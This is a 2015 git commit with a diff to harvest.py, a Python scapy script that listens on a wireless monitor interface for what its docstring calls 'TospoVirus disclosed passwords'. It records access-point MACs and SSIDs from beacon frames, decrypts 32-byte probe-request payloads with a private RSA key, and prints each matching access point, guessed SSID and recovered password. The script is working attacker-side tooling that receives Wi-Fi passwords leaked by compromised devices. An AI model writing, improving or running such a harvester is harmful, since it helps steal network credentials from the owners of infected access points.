4c246896992c12d4748c379f1220e80a131ce5b7
catatonic <catatonicprime@gmail.com>
2015-07-26 23:43:46 -0700

    - Increasing effectiveness of harvester script to try harder to identify which SSID is using the disclosed password while still showing the real AP MAC etc.

--- harvest.py
+++ harvest.py
@@ -1,16 +1,29 @@
 __author__ = 'catatonic'
+"""
+harvest.py:
+    Identifies potential candidate packets for TospoVirus disclosed passwords.
+"""
 
 from scapy.all import *
 import urllib
 from subprocess import Popen
+import difflib
 
+ap_list = {}
 def monitor(pkt):
+    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
+        if pkt.addr2 not in ap_list and len(pkt.info) > 0:
+            ap_list[pkt.addr2] = pkt.info
+            print "adding: %s %s" %(pkt.addr2, pkt.info)
     if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4 and len(pkt.info) == 32:
-	print "Detected candidate packet for AP with MAC: %s" %(pkt.addr2)
-	dec = Popen(['openssl', 'rsautl', '-decrypt', '-inkey', 'tvd.pem'], stdin=subprocess.PIPE)
+	dec = Popen(['openssl', 'rsautl', '-decrypt', '-inkey', 'tvd.pem'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
 	dec.stdin.write(pkt.info)
 	dec.stdin.close()
 	dec.wait()
+        rc = dec.returncode
+        if rc == 0:
+            for close_match in difflib.get_close_matches(pkt.addr2, ap_list):
+                print "AP: %s Guessed SSID: %s Pass: %s" %(pkt.addr2, ap_list[close_match], dec.stdout.readline())
 
 conf.iface = 'wlan0mon'
 print '[*] Monitoring'
